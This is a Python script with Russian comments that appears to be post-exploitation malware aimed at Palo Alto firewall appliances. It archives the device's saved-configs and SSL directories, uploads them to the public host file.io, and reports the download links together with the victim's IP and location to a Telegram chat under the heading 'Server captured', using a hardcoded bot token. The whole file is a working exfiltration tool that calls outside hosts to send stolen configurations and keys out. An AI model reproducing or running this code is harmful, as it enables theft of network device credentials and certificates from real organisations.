import requests
import os
import tarfile
import io
import hashlib

def archive_directory(directory_path):
    """
    Упаковывает директорию в архив формата tar.gz.
    """
    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
        # Проверяем, что путь - директория
        if os.path.isdir(directory_path):
            # Добавляем содержимое директории
            for root, dirs, files in os.walk(directory_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    # Относительный путь для сохранения структуры директорий
                    arcname = os.path.relpath(file_path, start=directory_path)
                    tar.add(file_path, arcname=arcname)
        else:
            raise ValueError(f"Путь {directory_path} не является директорией")
    tar_stream.seek(0)
    return tar_stream

def upload_file_to_public_file_host(file_path):
    """
    Загружает файл на публичный файловый обменник (например, file.io)
    и возвращает ссылку на загруженный файл.
    """
    upload_url = 'https://file.io'
    files = {'file': open(file_path, 'rb')}
    
    response = requests.post(upload_url, files=files)
    
    if response.status_code == 200:
        # Получаем ссылку на загруженный файл
        return response.json().get('link')
    else:
        print(f"Ошибка при загрузке файла {file_path}. Код ошибки: {response.status_code}")
        return None

def send_telegram_message_with_file_links(message, file_paths):
    """
    Отправляет сообщение и ссылки на файлы в Telegram.
    """
    tg_bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'
    tg_chat_id = '-1002403648422'
    
    # Формируем ссылку на Telegram API
    url = f'https://api.telegram.org/bot{tg_bot_token}/sendMessage'

    # Получаем ссылки на файлы
    file_links = []
    for file_path in file_paths:
        file_link = upload_file_to_public_file_host(file_path)
        if file_link:
            file_links.append(file_link)

    if file_links:
        # Формируем сообщение с ссылками на файлы
        message += "\n\n" + "\n".join([f"Файл доступен по ссылке: {link}" for link in file_links])
    
        payload = {
            'chat_id': tg_chat_id,
            'text': message
        }
    
        # Отправка сообщения
        response = requests.post(url, data=payload, verify=False)
        return response.ok
    else:
        print("Не удалось загрузить файлы.")
        return False

def main():
    try:
        # Получаем IP из внешнего ресурса
        ip_info = requests.get("http://ip-api.com/json", verify=False).json()
        ip = ip_info["query"]
        country = ip_info["country"]
        city = ip_info["city"]

        ip_hash = hashlib.sha256(ip.encode("utf-8")).hexdigest()

        # Формируем сообщение
        message = "🟢 Server captured\n"
        message += f"------------------\n"
        message += f"IP: {ip}\n"
        message += f"Country: {country}\n"
        message += f"City: {city}\n"
        message += f"------------------\n"
        message += f"#{str(ip_hash)[:8]}"  # Используем хэш IP

        # Пути к директориям
        directories_to_archive = ["/opt/pancfg/mgmt/saved-configs", "/opt/pancfg/mgmt/ssl"]
        
        # Упаковка директорий в архивы
        archived_files = []
        for directory in directories_to_archive:
            archive_stream = archive_directory(directory)
            archive_path = f"{os.path.basename(directory)}.tar.gz"
            with open(archive_path, 'wb') as f:
                f.write(archive_stream.read())
            archived_files.append(archive_path)

        if archived_files:
            # Отправка сообщений с ссылками на файлы
            success = send_telegram_message_with_file_links(message, archived_files)
            if success:
                print("Message sent successfully!")
            else:
                print("Error sending message.")
            
            # Если файлы успешно загружены на сервер, отправляем их
            print("Successfully uploaded files:", archived_files)
        else:
            print("No files to upload.")
    
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    main()
